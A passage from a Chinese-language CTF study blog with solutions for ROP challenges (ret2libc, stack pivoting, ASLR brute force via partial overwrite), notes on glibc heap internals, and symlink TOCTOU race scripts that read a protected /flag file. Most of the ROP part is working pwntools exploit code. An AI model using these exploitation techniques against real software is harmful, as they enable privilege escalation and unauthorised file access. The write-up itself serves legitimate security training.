<p>本地成功了, 现查system函数和/bin/sh字符串的偏移直接写出脚本, 但是远程不仅没法attach, 还不能strace, 明明就是那个偏移却运行不了. 难不成想让我用别的方法?</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level7.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;ltrace &#x27;+binary, shell=True)</span><br>p = process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27;is: 0x&#x27;</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>log.info(<span class="hljs-built_in">hex</span>(sys_addr))<br>binsh = sys_addr+<span class="hljs-number">0x13f112</span><br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x63</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401af3</span>, binsh, sys_addr])<br>p.sendline(pl)<br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>p.recvall()<br></code></pre></div></td></tr></table></figure>

<h4 id="level8-3"><a href="#level8-3" class="headerlink" title="level8"></a>level8</h4><p>本地成功了, 远程懒得试.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level8.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(binary)<br>elf = ELF(binary)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;) 通过maps找到对应libc文件.</span><br>libc = ELF(<span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>) <span class="hljs-comment">#本地测试libc文件.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;challenge&#x27;</span>]])<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>p.sendline(pl)<br>p.recvuntil(<span class="hljs-string">b&#x27;ving!\n&#x27;</span>)<br>puts = <span class="hljs-built_in">int</span>.from_bytes(p.recv(<span class="hljs-number">6</span>), byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, binsh, sys])<br>p.sendline(pl)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h4 id="level9-3"><a href="#level9-3" class="headerlink" title="level9"></a>level9</h4><p><strong>stack pivot!!!!</strong> </p>
<p>以前做过了.</p>
<p>pop_rbp, bss_s<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="这里要指向2处的地址, 也就是bss+0x10
">[1]</span></a></sup>, challenge || leave_ret, 0(useless rbp), pop_rdi<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.
">[2]</span></a></sup> || got[puts], plt[puts]<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="这之后要接收puts的地址. 
">[3]</span></a></sup>, pop_rdi || str_binsh, system.</p>
<h4 id="level10-3"><a href="#level10-3" class="headerlink" title="level10"></a>level10</h4><p>开了PIE, 而且win是用mmap分配到一个随机的地址, 然后只给读和执行的权限, 所以主要利用的gadget还是在libc_csu_init里面的. 而aslr的开启导致stack的位置也是未知的.</p>
<p><del>由于gadget是在rodata段, ROPgadget无法分析, 所以在pwndbg中使用rop命令来分析mmap+mprotect后的区域.</del><br><del>注意只有最后3位是有用的.</del>  rodata段是win函数, 通过mmap+memcpy复制到高地址空间中.</p>
<blockquote>
<p>如果该段不可执行ropgadget也不会对这里进行分析.</p>
</blockquote>
<hr>
<p>不过在这一题中<strong>直接给出了buf的位置</strong>.</p>
<p>mmap的空间总是在ld共享库的上方, 和stack没有关联. 不过challeng中mmap的返回值就存在栈上, 也就是buf的上方8字节.<br>需要栈转移来将这个指针作为ret_address, 这样就可以直接跳到win.</p>
<p>因为有aslr, 所以gadget之间的数据需要固定一个值, 这个值可以在开了aslr的gdb中获取, 然后不断尝试直到新的一次第四位刚好和选中的值相等.</p>
<p>这次的幸运数字是0xd57000. 所有在ida看到的地址都要加上这一个偏移量.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level10.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *challenge+0x109</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x88</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x3b\x87&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>: <br>        p.kill()<br></code></pre></div></td></tr></table></figure>

<p>远程跑总是有点问题, 没法调试. 懒得管了.</p>
<img src="../../image/pwn-modules/image-20220507162940280.png" srcset="/img/loading.gif" lazyload alt="image-20220507162940280" style="zoom:80%;" />

<h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><p>和上一题一样, 不过challenge()函数的主逻辑前后都加上了超级多的nop作为填充. 这有啥用?</p>
<p>确实没有区别. 改一改偏移量就过了.</p>
<h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><p>保护没有变化. 这又有什么区别?? 0号程序还提供了win函数的地址, 这不白给么.</p>
<ul>
<li>突然就不行了, 使用gdb的record来查找问题, 好像只能在当前执行过程中使用save和restore命令.</li>
<li>ROPgadget使用only命令的时候想要的命令要全部打出来, 而不仅是或的关系.</li>
<li><code>find /tmp -atime +5 -exec rm -rf &#123;&#125; +</code> 还是别用了.</li>
<li><code>egrep &#39;(pop (rbp|rsp))|leave&#39; -a libc233.gadget</code> ==<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.33.so --only &#39;pop|ret&#39;</code> </li>
</ul>
<p>这题原来指的是从libc中进行ROP, 因为main函数返回到了高地址中的libc.so中.可以直接在libc文件中搜索可执行的ROP段.<del>也不一定要leave, <code>pop rsp</code>不照样行.</del>还是不行. 乖乖leave吧.</p>
<p>2.33中:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#0x000000000004e250 : leave ; ret</span><br><span class="hljs-number">0x000000000002798b</span> : pop rsp ; ret  <br><span class="hljs-number">0x0000000000027e3f</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret<br><span class="hljs-number">0x0000000000027c27</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret<br></code></pre></div></td></tr></table></figure>

<blockquote>
<p>2.31中:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000000578f8</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000000c7ad3</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret 0xfff6</span><br></code></pre></div></td></tr></table></figure>
<p>main返回地址到libc偏移: 0x270b3</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#这个是main函数的返回地址</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x7efef009a7ed</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7efef0099000</span>     <span class="hljs-number">0x7efef01e1000</span> r-xp   <span class="hljs-number">148000</span> <span class="hljs-number">26000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.33</span>.so +<span class="hljs-number">0x17ed</span><br>    <br><span class="hljs-comment">#到libc初始的偏移是`0x277ed`:</span><br>pwndbg&gt; distance <span class="hljs-number">0x7f6b0c0fb000</span> <span class="hljs-number">0x7f6b0c1227ed</span><br>	<span class="hljs-number">0x7f6b0c0fb000</span>-&gt;<span class="hljs-number">0x7f6b0c1227ed</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x277ed</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x4efd</span> words)<br></code></pre></div></td></tr></table></figure>

<p>诶得16*16*16分之1的几率啊, 这也太低了点, 不过想不出来了, 就这么干. <code>0x254000+0x4e250=0x2A2250</code> </p>
<blockquote>
<p><del>又发现地址好像和libc没什么关系, 是紧挨着ld.so的…</del> 这个方向错了</p>
<img src="../../image/pwn-modules/image-20220508231821229.png" srcset="/img/loading.gif" lazyload alt="image-20220508231821229" style="zoom:67%;" /> 
</blockquote>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *main+0x19f</span><br><span class="hljs-string">    init-pwndbg</span><br><span class="hljs-string">    lm</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x50\x22\x2a&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.kill()<br></code></pre></div></td></tr></table></figure>

<h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><p>看看这题又要搞什么幺蛾子.</p>
<p>保护全开, 给出buf位置, 可以leak任意一个地址上8字节数据.</p>
<p>???这不leak一个canary出来, 然后返回地址改成….和上一题一样了. ret2libc</p>
<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><p>socket</p>
<h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><h4 id="key"><a href="#key" class="headerlink" title="key:"></a>key:</h4><ul>
<li><p>Dynamic Allocators:</p>
<ul>
<li>General Purpose: Doug Lea (pictured) releases <strong>dlmalloc</strong> into public domain in 1987.</li>
<li>Linux: <strong>ptmalloc</strong> (Posix Thread aware fork of dlmalloc)</li>
<li>FreeBSD: <strong>jemalloc</strong> (also used in Firefox, Android)</li>
<li>Windows: Segment Heap, <strong>NT Heap</strong></li>
<li>Kernel allocators: <strong>kmalloc</strong> (Linux kernel memory allocator)kalloc (iOS kernel memory allocator)</li>
</ul>
</li>
<li><p>managed by the brk and sbrk system calls:</p>
<ul>
<li>sbrk(NULL) returns the end of the data segment</li>
<li>sbrk(delta) expands the end of the data segment by delta bytes</li>
<li>brk(addr) expands the end of the data segment to addr</li>
</ul>
</li>
</ul>
<p>ubuntu 2004还在图中粗线框的阶段, 这是由于tcache的引入. 不过这个module并不会深入这个cache.</p>
<img src="../../image/pwn-modules/image-20220505165437735.png" srcset="/img/loading.gif" lazyload alt="image-20220505165437735" style="zoom: 50%;" />

<ul>
<li><p>tcache: </p>
<ul>
<li>a <strong>caching</strong> layer for “small” allocations (&lt;1032 bytes on amd64)</li>
<li>makes a <strong>singly-linked-list</strong> using the first word of the free chunk</li>
<li><strong>very few</strong> security checks</li>
</ul>
</li>
<li><p>setvbuf: scanf and printf will use malloc in themselves for buffering, we can use <code>setvbuf(stdin/out, NULL)</code> to disable it. (and avoiding confusion in heap exploitation.)</p>
</li>
<li><p>ptmalloc caches(for review):</p>
<ul>
<li>64 singly-linked tcache bins for allocations of size 16 to 1032(functionally “covers” fastbins andsmallbins)</li>
</ul>
<ol start="2">
<li>10 singly-linked “fast” bins for allocations of size up to 160 bytes</li>
</ol>
<ul>
<li>1 doubly-linked “unsorted” bin to quickly stash <strong>free()d</strong> chunks that don’t fit into tcache orfastbins</li>
<li>64 doubly-linked “small” bins for allocations up to 512 bytes</li>
</ul>
<ol start="5">
<li>doubly-linked “large” bins (anything over 512 bytes) that contain different-sized chunks</li>
</ol>
</li>
<li><p>The Unlink Attack, Poison Null Byte</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/14SYq0TTVxEGWHNUG1BP66A8liPDD2pqJUs2WrXlCZNE/edit#slide=id.g47fd1f5b33_0_204">further reading</a>. </p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://sourceware.org/glibc/wiki/MallocInternals">malloc internals</a> </p>
<p><a target="_blank" rel="noopener" href="https://seclists.org/bugtraq/2005/Oct/118">the rise of houses</a> </p>
<h1 id="module-C-race"><a href="#module-C-race" class="headerlink" title="module C-race"></a>module C-race</h1><h4 id="key-points"><a href="#key-points" class="headerlink" title="key points"></a>key points</h4><ul>
<li>在一个程序打开文件并写入然后再到执行它的期间进程可能被调度, 这个时候如果文件被改写那么就会出现竞态条件.</li>
<li>如果这个窗口太短那么竞态条件出现的几率就会更小</li>
<li>有一个系统调用<strong>nice</strong>, 对应于nice命令, 还有一个ionice, 就是字面意思上的run a program with modified scheduling priority</li>
<li>通过非常长的路径搜索可以减慢程序执行, 进而加大竞态窗口. 可以使用符号链接来循环查找同一根目录下的多条长路径, 来达到同样的效果.</li>
</ul>
<img src="../../image/pwn-modules/image-20220511235547367.png" srcset="/img/loading.gif" lazyload alt="image-20220511235547367" style="zoom: 67%;" />

<ul>
<li>Mitigations<ol>
<li>Safer programming practices (O_NOFOLLOW, mkstemp(), etc).</li>
<li>Symlink protections in /tmp<br> a. root cannot follow symlinks in /tmp that are owned by other users<br> b.specifically made to prevent these sorts of issues</li>
</ol>
</li>
<li>非libc的库函数要直接进行编译要给gcc传递相应的链接参数.</li>
<li>pthread:<ul>
<li><code>pthread_t</code> | <code>pthread_create()</code> | <code>pthread_join()</code>:waits for the thread specified by thread to terminate.</li>
<li>实际用的是<code>clone()</code>系统调用.</li>
</ul>
</li>
<li>discrepancies between <strong>libc call</strong> and <strong>raw syscall</strong>: <ul>
<li>setuid() in libc sets the uid for all threads of the process, raw syscall will only set the caller thread.</li>
<li>exit() in libc will call exit_group(), so exit all threads, but raw syscall only exit caller thread.</li>
</ul>
</li>
<li>实际中常使用全局变量来控制线程的执行.</li>
<li>对内存的读写同样会产生竞态条件.</li>
<li>Data races: 自增的多步骤指令. 不过可以通过上锁解决.</li>
<li>Detect: valgrind, <a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1u-aSz-mqwkMIZEDAR-AEPKw5JPn-1q_3Ek_C6JjQUzY/edit#slide=id.gac4ec7d1a7_0_49">学术界</a> </li>
<li>signals and reentrancy: <ul>
<li>use signal to interrupt normal execution control flow.</li>
<li>use signal function to reenter function.</li>
<li>DO NOT call non-reentrant funtions in your signal handlers.<ul>
<li>Your handler might have interrupted those functions mid-execution.</li>
<li>Another signal might interrupt your signal handler’s non-reentrant invocations mid-execution!</li>
<li>Depending on settings (<code>SA_NODEFER</code> flag to sigaction()), another iteration of the same signal might interrupt your signal!</li>
</ul>
</li>
<li><code>man signal-safety</code> to see all reentrant libc funtions.</li>
</ul>
</li>
</ul>
<blockquote>
<p>YouTube-50是babyrace的视频. level5做不下去了准备看看.</p>
</blockquote>
<p><strong>补充:</strong> </p>
<ul>
<li><p>level5 shell script问题出在rm mv都有一个启动时间和一堆系统调用, 再加上shell是靠fork+exec来执行进程的, 所以就会比较慢, 可能会出现左图中的情况, 就算把几个命令分开进多个循环也还是太慢. 如果写进c, 那就是右图中的理想状态了:<br><img src="../../image/pwn-modules/image-20220516162810899.png" srcset="/img/loading.gif" lazyload alt="image-20220516162810899" style="zoom:80%;" /><img src="../../image/pwn-modules/image-20220516163018313.png" srcset="/img/loading.gif" lazyload alt="image-20220516162810899" style="zoom:80%;" /> </p>
</li>
<li><p>使用python的话启动比较慢是事实, 但是进入执行之后到系统调用层面是和c差不多的, 所以只要在python里面进行loop就能达到一样的效果. 想起来前几天看的dirty cow使用的race condition的poc就是用c写的.</p>
<ul>
<li>python的话要大量使用到os module来调用系统. 可得好好看看.(练了练shell也不亏就是了)</li>
</ul>
</li>
</ul>
<h4 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h4><p>先整个创建超级长的路径的脚本. 顺便学了学shell编程.</p>
<p>难怪视频里只见到t_end, 因为这样路径上每个文件夹其实都是符号链接, 所以最多20个.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>ln -s $(pwd) ./root<br>for i in &#123;97..116&#125;	#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    pushd .<br>    mkdir $prefix<br>    cd $prefix<br>    for j in &#123;1..25&#125;<br>    do<br>        mkdir ./$j<br>        cd ./$j<br>    done<br>    innerwd=$(pwd)<br>    popd<br>    cp -a ./root $innerwd<br>    ln -s $innerwd $(pwd)/$&#123;prefix&#125;_end<br>done<br></code></pre></div></td></tr></table></figure>

<p>生成路径字符串: 如果路径上还有符号链接那还得再减少几个.</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>path=&#x27;./&#x27; <br>for i in &#123;97..116&#125; 	#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    path+=$&#123;prefix&#125;_end/root/<br><br>done<br>ls $path	#test path(though must be true...)<br><span class="hljs-meta">#</span><span class="bash">result is:</span><br>./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/t_end/root/<br></code></pre></div></td></tr></table></figure>

<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>在程序使用第一个参数当做字符串open文件之前直接停下来等我, 这个时候就可以更改flag的符号链接为那个名字, 于是绕过了不能含有’flag’字符和不能是符号链接的限制.</p>
<h5 id="1程序的补充shell"><a href="#1程序的补充shell" class="headerlink" title=".1程序的补充shell"></a>.1程序的补充shell</h5><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>rm aa bb cc 2&gt;/dev/null<br>touch aa<br>ln -s /flag ./cc<br><span class="hljs-meta">#</span><span class="bash">一开始是一个普通文件, 然后改成到/flag的符号链接</span><br>while [ 1 ]<br>do<br>    #sleep 0.05 #不知道有没有用的说...希望有. 果然没用<br>    mv bb aa <br>    sleep 0.0005<br>    mv aa bb<br>    mv cc aa<br>    sleep 0.0005<br>    mv aa cc<br>done<br></code></pre></div></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure>

<p>删除一堆文件夹:</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r !(peda|*sh)<br></code></pre></div></td></tr></table></figure>

<h5 id="成功率比较"><a href="#成功率比较" class="headerlink" title="成功率比较"></a>成功率比较</h5><blockquote>
<p>改成短路径之后进行了一下成功率比较:</p>
</blockquote>
<p>比较shellscript: </p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br>path_2=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/<br>rate=0<br>rates=0<br>ratess=0<br>for i in &#123;1..1000&#125;<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rate++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 $&#123;path_2&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((ratess++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 ./aa | grep 